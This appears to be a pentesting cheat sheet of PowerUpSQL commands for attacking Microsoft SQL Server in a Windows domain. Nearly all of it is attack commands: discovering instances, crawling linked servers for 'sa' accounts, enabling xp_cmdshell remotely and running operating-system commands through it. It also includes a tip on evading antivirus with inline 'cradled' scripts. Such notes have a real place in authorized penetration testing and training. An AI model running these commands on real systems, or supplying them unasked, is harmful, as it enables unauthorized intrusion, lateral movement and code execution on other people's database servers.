# MSSQL Authentication

## PowerUp
```powershell
# Discovery (SPN Scanning)
Get-SQLInstanceDomain

# Discovery (Broadcast Domain)
Get-SqlInstanceBroadcast

# Discovery (Broadcast Domain)
Get-SqlInstanceScanUDP
Get-SqlInstanceScanUDPThreaded

# Check Accessibility
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

#Gather Information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Search for database links to remote servers
Get-SQLServerLink -Instance <Instance> -Verbose
Get-SQLServerLinkCrawl -Instance <Instance> -Verbose

# Where instance user matches "sa"
Get-SQLServerLinkCrawl -Instance <Instance> | Where-Object {$_.User -match 'sa'}

# Execute commands ( If xp_cmdshell or RPC out is set to enabled)
# If AV is enabled run cradled scripts with functions inline with the script
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "<Instance>"
Get-SQLServerLinkCrawl -Instance <Instance> "exec master..xp_cmdshell 'whoami'" -Query

# Scan for misconfigurations and vulnerabilities
Invoke-SQLAudit -Verbose -Instance <Server>
```
